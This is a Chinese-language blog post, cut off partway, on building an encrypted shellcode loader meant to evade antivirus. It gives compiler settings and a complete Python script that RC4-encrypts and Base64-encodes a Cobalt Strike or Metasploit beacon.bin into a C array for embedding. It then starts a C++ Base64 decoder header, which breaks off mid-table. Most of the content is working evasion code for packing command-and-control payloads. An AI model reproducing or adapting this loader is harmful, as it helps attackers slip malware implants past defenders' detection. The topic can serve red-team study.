<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Shellcode 加密加载技术实战 | kenny's blog</title><meta name="author" content="Kenny"><meta name="copyright" content="Kenny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="f6f7f9"><meta name="description" content="Visual Studio 开发环境配置在开始 Shellcode 加载器开发前，需要正确配置 Visual Studio 编译环境。以下是关键配置步骤：  配置要点：  关闭 SDL 检查（Security Development Lifecycle），避免编译器对某些 API 的限制 设置字符集为多字节字符集（MBCS），兼容性更好 关闭增量链接，减少可执行文件体积 优化代码生成选项，选择最小">
<meta property="og:type" content="article">
<meta property="og:title" content="Shellcode 加密加载技术实战">
<meta property="og:url" content="https://www.52jl.top/2026/02/11/cs2/index.html">
<meta property="og:site_name" content="kenny&#39;s blog">
<meta property="og:description" content="Visual Studio 开发环境配置在开始 Shellcode 加载器开发前，需要正确配置 Visual Studio 编译环境。以下是关键配置步骤：  配置要点：  关闭 SDL 检查（Security Development Lifecycle），避免编译器对某些 API 的限制 设置字符集为多字节字符集（MBCS），兼容性更好 关闭增量链接，减少可执行文件体积 优化代码生成选项，选择最小">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.52jl.top/img/covers/shinchan-cover-02.webp">
<meta property="article:published_time" content="2026-02-11T13:37:05.000Z">
<meta property="article:modified_time" content="2026-02-13T11:11:35.200Z">
<meta property="article:author" content="Kenny">
<meta property="article:tag" content="Base64">
<meta property="article:tag" content="IAT Hook">
<meta property="article:tag" content="RC4">
<meta property="article:tag" content="Shellcode">
<meta property="article:tag" content="加载器">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.52jl.top/img/covers/shinchan-cover-02.webp"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Shellcode 加密加载技术实战",
  "url": "https://www.52jl.top/2026/02/11/cs2/",
  "image": "https://www.52jl.top/img/covers/shinchan-cover-02.webp",
  "datePublished": "2026-02-11T13:37:05.000Z",
  "dateModified": "2026-02-13T11:11:35.200Z",
  "author": [
    {
      "@type": "Person",
      "name": "Kenny",
      "url": "https://www.52jl.top"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.52jl.top/2026/02/11/cs2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: false,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Shellcode 加密加载技术实战',
  isHighlightShrink: false,
  isToc: false,
  pageType: 'post'
}</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css?v=20260213b"><meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex,max-snippet:0,max-image-preview:none,max-video-preview:0">
<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
<script>
(() => {
  try {
    const isAutomation = navigator.webdriver || /HeadlessChrome|PhantomJS|puppeteer|playwright/i.test(navigator.userAgent || '');
    if (!isAutomation) return;
    const selectors = ['#article-container', 'article', '.post-content', '.post-body'];
    selectors.forEach((s) => {
      document.querySelectorAll(s).forEach((el) => {
        el.innerHTML = '<p>Content unavailable.</p>';
      });
    });
  } catch (e) {}
})();
</script>
<meta name="referrer" content="no-referrer">
<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: blob:; script-src 'self' https: 'unsafe-inline' 'unsafe-eval'; style-src 'self' https: 'unsafe-inline'; img-src 'self' https: data: blob:; font-src 'self' https: data:; connect-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests">
<script>
(() => {
  try {
    if (window.top !== window.self) {
      window.top.location = window.self.location.href;
      return;
    }

    const host = window.location.hostname;
    const isLocal = host === 'localhost' || host === '127.0.0.1';
    if (!isLocal && window.location.protocol === 'http:') {
      window.location.replace('https://' + window.location.host + window.location.pathname + window.location.search + window.location.hash);
    }
  } catch (e) {}
})();
</script>
</head><body><div class="bg-animation" id="web_bg" style="background-color: #f6f7f9;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">kenny's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Shellcode 加密加载技术实战</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Shellcode 加密加载技术实战</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-11T13:37:05.000Z" title="发表于 2026-02-11 21:37:05">2026-02-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-13T11:11:35.200Z" title="更新于 2026-02-13 19:11:35">2026-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%8D%E6%9D%80%E4%B8%8E%E5%8A%A0%E8%BD%BD/">免杀与加载</a></span></div><div class="meta-secondline"></div></div></div><article class="container post-content" id="article-container"><h1 id="Visual-Studio-开发环境配置"><a href="#Visual-Studio-开发环境配置" class="headerlink" title="Visual Studio 开发环境配置"></a>Visual Studio 开发环境配置</h1><p>在开始 Shellcode 加载器开发前，需要正确配置 Visual Studio 编译环境。以下是关键配置步骤：</p>
<p><img src="/2026/02/11/cs2/2.webp" loading='lazy'><br><img src="/2026/02/11/cs2/3.webp" loading='lazy'><br><img src="/2026/02/11/cs2/4.webp" loading='lazy'><br><img src="/2026/02/11/cs2/5.webp" loading='lazy'><br><img src="/2026/02/11/cs2/6.webp" loading='lazy'><br><img src="/2026/02/11/cs2/7.webp" loading='lazy'><br><img src="/2026/02/11/cs2/8.webp" loading='lazy'><br><img src="/2026/02/11/cs2/10.webp" loading='lazy'><br><img src="/2026/02/11/cs2/11.webp" loading='lazy'><br><img src="/2026/02/11/cs2/12.webp" loading='lazy'><br><img src="/2026/02/11/cs2/13.webp" loading='lazy'></p>
<p><strong>配置要点</strong>：</p>
<ul>
<li>关闭 SDL 检查（Security Development Lifecycle），避免编译器对某些 API 的限制</li>
<li>设置字符集为多字节字符集（MBCS），兼容性更好</li>
<li>关闭增量链接，减少可执行文件体积</li>
<li>优化代码生成选项，选择最小体积（&#x2F;O1）或最大速度（&#x2F;O2）</li>
<li>静态链接运行时库（&#x2F;MT），避免依赖外部 DLL</li>
</ul>
<hr>
<h1 id="方案一：RC4-Base64-组合加密"><a href="#方案一：RC4-Base64-组合加密" class="headerlink" title="方案一：RC4 + Base64 组合加密"></a>方案一：RC4 + Base64 组合加密</h1><p>这是目前主流的 Shellcode 混淆方案，通过双层加密有效对抗静态特征检测。加密流程为：<strong>原始 Shellcode → RC4 加密 → Base64 编码 → C 数组</strong>。</p>
<h2 id="加密脚本实现"><a href="#加密脚本实现" class="headerlink" title="加密脚本实现"></a>加密脚本实现</h2><p>使用 Python 实现 Shellcode 的加密处理，生成可直接嵌入 C++ 代码的数组格式。</p>
<h3 id="核心加密脚本"><a href="#核心加密脚本" class="headerlink" title="核心加密脚本"></a>核心加密脚本</h3><p>首先从 Cobalt Strike 或 MSF 生成 <code>.bin</code> 格式的原始 Shellcode，然后使用以下脚本进行加密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 纯 Python 实现 RC4 加密（无需第三方库，避免环境依赖）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_encrypt</span>(<span class="params">key, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    RC4 流加密算法实现</span></span><br><span class="line"><span class="string">    :param key: 加密密钥（bytes 类型）</span></span><br><span class="line"><span class="string">    :param data: 待加密数据（bytes 类型）</span></span><br><span class="line"><span class="string">    :return: 加密后的数据（bytes 类型）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 初始化 S 盒（256 字节状态数组）</span></span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># KSA 密钥调度算法</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_len]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># PRGA 伪随机生成算法（加密核心）</span></span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    encrypted = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        k = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        encrypted.append(byte ^ k)  <span class="comment"># XOR 运算加密</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(encrypted)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_binary_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;读取二进制 Shellcode 文件&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">        <span class="keyword">raise</span> FileNotFoundError(<span class="string">f&quot;文件 <span class="subst">&#123;filename&#125;</span> 不存在！&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">return</span> file.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Base64 编码&quot;&quot;&quot;</span></span><br><span class="line">    encoded_data = base64.b64encode(data)</span><br><span class="line">    <span class="keyword">return</span> encoded_data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_c_array</span>(<span class="params">data_str</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成 C 语言数组格式（每行 100 个字符，便于阅读）&quot;&quot;&quot;</span></span><br><span class="line">    c_array_lines = []</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(data_str):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">            c_array_lines.append(<span class="string">&quot;\n\t&quot;</span>)</span><br><span class="line">        c_array_lines.append(<span class="string">f&quot;0x<span class="subst">&#123;<span class="built_in">ord</span>(char):02X&#125;</span>, &quot;</span>)</span><br><span class="line">    c_array = <span class="string">&quot;&quot;</span>.join(c_array_lines).rstrip(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;&quot;</span> + c_array + <span class="string">&quot;\n&#125;;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filename = <span class="string">&quot;beacon.bin&quot;</span>          <span class="comment"># 输入：原始 Shellcode</span></span><br><span class="line">        output_filename = <span class="string">&quot;res.txt&quot;</span>      <span class="comment"># 输出：加密后的 C 数组</span></span><br><span class="line">        key = <span class="string">b&quot;kenny&quot;</span>                   <span class="comment"># RC4 密钥（需与加载器保持一致）</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 正在读取文件: <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">        binary_data = read_binary_file(filename)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> binary_data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 警告：读取的文件为空！&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Shellcode 大小: <span class="subst">&#123;<span class="built_in">len</span>(binary_data)&#125;</span> 字节&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 正在执行 RC4 加密...&quot;</span>)</span><br><span class="line">        encrypted_data = rc4_encrypt(key, binary_data)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 正在执行 Base64 编码...&quot;</span>)</span><br><span class="line">        encoded_data = base64_encode(encrypted_data)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 正在生成 C 数组格式...&quot;</span>)</span><br><span class="line">        c_array = generate_c_array(encoded_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_filename, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(c_array)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 操作完成！结果已保存到: <span class="subst">&#123;output_filename&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 加密后大小: <span class="subst">&#123;<span class="built_in">len</span>(encoded_data)&#125;</span> 字符&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 执行出错: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span> - <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><strong>关键点说明</strong>：</p>
<ul>
<li><strong>密钥选择</strong>：避免使用常见密钥（如 <code>password</code>、<code>123456</code>），建议使用随机字符串</li>
<li><strong>RC4 特性</strong>：加密和解密使用相同算法，密钥相同即可还原</li>
<li><strong>Base64 作用</strong>：将二进制数据转为可打印字符，便于嵌入源码，同时增加一层混淆</li>
</ul>
<hr>
<h2 id="解密头文件实现"><a href="#解密头文件实现" class="headerlink" title="解密头文件实现"></a>解密头文件实现</h2><p>加载器需要实现 Base64 解码和 RC4 解密功能，以下是完整的头文件实现。</p>
<p><img src="/2026/02/11/cs2/1.webp" loading='lazy'></p>
<h3 id="base64-h-Base64-解码实现"><a href="#base64-h-Base64-解码实现" class="headerlink" title="base64.h - Base64 解码实现"></a>base64.h - Base64 解码实现</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdexcept&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 标准 Base64 编码表（RFC4648）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> base64_table[] =</span><br><span class="line"><span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"><span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"><span class="string">&quot;0123456789+/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief Base64 解码快速查找表（-1=非法字符，-2=填充符=）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">int8_t</span> base64_decode_table[] = &#123;</span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>,</span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>,</span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">62</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">63</span>,</span><br><span class="line">    <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-2</span>, <span class="number">-1</span>, <span class="number">-1</span>,</span><br><span class="line">    <span class="number">-1</span>,  <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>,</span><br><span class="line">    <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>,</span><br><span class="line">    <span class="number">-1</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>,</span><br><span class="line">    <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span 